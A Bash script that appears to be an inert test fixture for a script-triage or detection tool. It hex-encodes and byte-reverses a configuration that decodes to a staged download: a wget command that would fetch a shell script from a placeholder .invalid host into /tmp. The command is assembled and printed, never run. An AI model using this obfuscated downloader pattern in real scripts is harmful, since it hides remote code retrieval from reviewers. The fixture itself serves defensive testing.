#!/usr/bin/env bash

# Huntress Script Triage -- inert static-analysis fixture (bash_linux)

readonly Material_bb1553a0='61:39:61:37:30:35:38:36:33:36:2d:65:67:61:74:73:2e:2f:65:68:63:61:63:2d:73:73:65:72:74:6e:75:68:2f:70:6d:74:2f:3d:68:74:61:70:5f:65:6c:69:66:7c:61:39:61:37:30:35:38:36:33:36:2f:62:61:4c:73:73:65:72:74:6e:75:48:3d:74:6e:65:67:61:5f:72:65:73:75:7c:68:73:2e:38:62:38:39:38:61:61:33:2f:64:69:6c:61:76:6e:69:2e:65:6c:70:6d:61:78:65:2e:61:39:61:37:30:35:38:36:33:36:2f:2f:3a:73:70:74:74:68:3d:6c:72:75:7c:61:39:61:37:30:35:38:36:33:36:2d:6e:67:69:61:70:6d:61:63:3d:64:69:5f:6e:67:69:61:70:6d:61:63:7c:31:3d:74:6e:75:6f:63:5f:65:67:61:74:73:7c:74:75:70:74:75:6f:5f:74:65:67:77:3d:72:65:74:70:61:64:61:7c:65:6c:69:66:5f:65:74:69:72:77:2c:65:74:6f:6d:65:72:5f:65:72:69:75:71:63:61:3d:73:70:65:74:73:7c:31:3d:76'

readonly Codec_bb1553a0='hex_colon|reverse_bytes|'



Load_bb1553a0() {

  EnCoDeD_Bytes=()

  local IFS=':' PaRt

  local -a pieces

  read -r -a pieces <<< "${Material_bb1553a0}"

  for PaRt in "${pieces[@]}"; do EnCoDeD_Bytes+=("$((16#$PaRt))"); done

}



Decode_bb1553a0() {

  DeCoDeD_Bytes=()

  local InDeX

  for ((InDeX=0; InDeX<${#EnCoDeD_Bytes[@]}; InDeX++)); do

    DeCoDeD_Bytes[${#EnCoDeD_Bytes[@]}-1-InDeX]="${EnCoDeD_Bytes[InDeX]}"

  done

}



Recover_bb1553a0() {

  local -a EnCoDeD_Bytes DeCoDeD_Bytes

  local DeScRiPtOr_Text NeUtRaL PaSs InDeX

  local -a compass=(north south); NeUtRaL="$(IFS=:; printf '%s' "${compass[*]}")"

  Load_bb1553a0

  case 1 in 1) Decode_bb1553a0 ;; *) return 70 ;; esac

  DeScRiPtOr_Text=''

  local octal character

  for InDeX in "${!DeCoDeD_Bytes[@]}"; do

    printf -v octal '%03o' "${DeCoDeD_Bytes[InDeX]}"

    printf -v character '%b' "\\$octal"

    DeScRiPtOr_Text+="$character"

  done

  printf '%s\n' "$DeScRiPtOr_Text"

}



Inspect_bb1553a0() { local recovered; recovered="$(Recover_bb1553a0)"; printf '%s\n' "$recovered"; }



Plan_bb1553a0() {

  local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''

  descriptor="$(Inspect_bb1553a0)"

  local -a fields

  IFS='|' read -r -a fields <<< "$descriptor"

  for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done

  local -a request_command=(wget -qO "$file_path" "$url")

  declare -p request_command

}



if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_bb1553a0; fi

